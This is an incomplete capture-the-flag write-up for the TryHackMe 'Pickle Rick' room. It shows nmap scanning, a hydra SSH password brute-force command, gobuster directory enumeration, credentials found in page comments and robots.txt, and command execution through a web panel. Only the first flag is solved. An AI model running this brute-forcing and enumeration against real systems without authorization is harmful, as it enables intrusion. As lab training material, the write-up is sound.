# pickle-rick

[Room](https://tryhackme.com/r/room/picklerick)

# What is the first ingredient that Rick needs?

The homepage's HTML gives the username

```html
<!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
```

Since the website doesn't seems to contains more than the SOS message in the index.html, maybe there is an SSH server running. In effect,

```
nmap 10.10.73.23
Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-01 16:50 -03
Host is up (0.34s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

We have one user, what if we use `hydra` to try to brute force the password?

```
hydra -l R1ckRul3s -P /usr/share/wordslists/rockyou.txt 10.10.73.23 ssh
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secre
t service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-01 17:00:17
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.10.73.23:22/
[ERROR] target ssh://10.10.73.23:22/ does not support password authentication (method reply 4)
```

Huh? What is the user for then? Running gobuster dir with a couple of Apache(the server on port 80 is running Apache) didn't work either.

Maybe the image has encoded data? Nope, exiftool doesn't reveal anything.

What if I just can login into the SSH server with the username?

```
ssh R1ckRul3s@10.10.73.23
R1ckRu3s@10.10.73.23: Permission denied (publickey)
```

Nope.

After a couple of days, I came back to Pickle Rick and I realize that the user might be a web application user, not an SSH one. This means that I should
perform directory enumeration

```
gobuster dir -u http://10.10.240.199 -w dirb/common.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.94.166
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordslists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/assets               (Status: 301) [Size: 313] [--> http://10.10.94.166/assets/]
/index.html           (Status: 200) [Size: 1062]
/robots.txt           (Status: 200) [Size: 17]
/server-status        (Status: 403) [Size: 277]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

What if we inpsect robots.txt? There we find the string `Wubbalubbadubdub` and nothing more. It should be a part of the website that bots are allowed/disallowed
to scan but it doesn't seem to be the case here. Maybe we just found the password to the `R1ckRul3s` user? Not so sure.

After some time, the answer came in the form of another dir enumeration, this time with

```
dirbuster dir -u http://10.10.94.166 -w php_files_only.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.94.166
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordslists/php_files_only.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 882]

```

![](/images/thm/pickle-rick/00.png)

Let's try with `R1ckRul3s:Wubbalubbadubdub`. And it works! Finally, some progress.

There is a command panel, with a text box and the rest of the sections of the site are blocked with a
legend "Only the REAL rick can view this page...". If we look at the login page code

![](/images/thm/pickle-rick/01.png)

We can see that there is a comment with a mysterious string: `Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==`.
Let's save it for another time. If we input a random string at the command panel nothing seems to happen. What if go with `pwd`?

![](/images/thm/pickle-rick/02.png)

We've got a hit! But `cat` doesn't seems to work

![](/images/thm/pickle-rick/03.png)

But `ls` works and it points to the right direction

![](/images/thm/pickle-rick/04.png)

Going to /Sup3rS3cretPickl3Ingred.txt gives the flag.

# What is the second ingredient in Rick’s potion?

# What is the last and final ingredient?

# Lessons Learned

- Run `nmap` with `-T4` to perform faster initial scans. Warning: this may trigger defense mechanisms on the target's side.
- More words: https://github.com/xajkep/wordlists/tree/master!
